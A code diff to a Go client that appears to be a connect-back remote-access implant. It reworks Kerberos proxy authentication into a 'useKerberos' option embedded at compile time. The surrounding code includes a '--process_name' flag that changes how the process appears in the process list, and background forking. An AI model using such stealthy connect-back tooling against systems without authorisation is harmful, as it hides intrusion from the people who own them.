@@ -7,6 +7,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strconv"
 	"strings"
 	"syscall"
@@ -38,7 +39,9 @@ var (
 	proxy       string
 	ignoreInput string
 	customSNI   string
-	winauth     bool = false
+	useKerberos bool
+	// golang can only embed strings using the compile time linker
+	useKerberosStr string
 )
 
 func printHelp() {
@@ -49,14 +52,16 @@ func printHelp() {
 	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
 	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
 	fmt.Println("\t\t--sni\tWhen using TLS set the clients requested SNI to this value")
-	fmt.Println("\t\t--winauth\tWhen using kerberos auth on proxy server")
-
+	if runtime.GOOS == "windows" {
+		fmt.Println("\t\t--use-kerberos\tUse kerberos authentication on proxy server (if proxy server specified)")
+	}
 }
 
 func main() {
+	useKerberos = useKerberosStr == "true"
 
 	if len(os.Args) == 0 || ignoreInput == "true" {
-		Run(destination, fingerprint, proxy, customSNI)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos)
 		return
 	}
 
@@ -97,7 +102,7 @@ func main() {
 	processArgv, _ := line.GetArgsString("process_name")
 
 	if line.IsSet("winauth") {
-		winauth = true
+		useKerberos = true
 	}
 
 	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
@@ -121,20 +126,20 @@ func main() {
 	}
 
 	if fg || child {
-		Run(destination, fingerprint, proxy, customSNI)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos)
 		return
 	}
 
 	if strings.HasPrefix(destination, "stdio://") {
 		// We cant fork off of an inetd style connection or stdin/out will be closed
 		log.SetOutput(io.Discard)
-		Run(destination, fingerprint, proxy, customSNI)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos)
 		return
 	}
 
-	err = Fork(destination, fingerprint, proxy, customSNI, processArgv...)
+	err = Fork(destination, fingerprint, proxy, customSNI, useKerberos, processArgv...)
 	if err != nil {
-		Run(destination, fingerprint, proxy, customSNI)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos)
 	}
 
 }
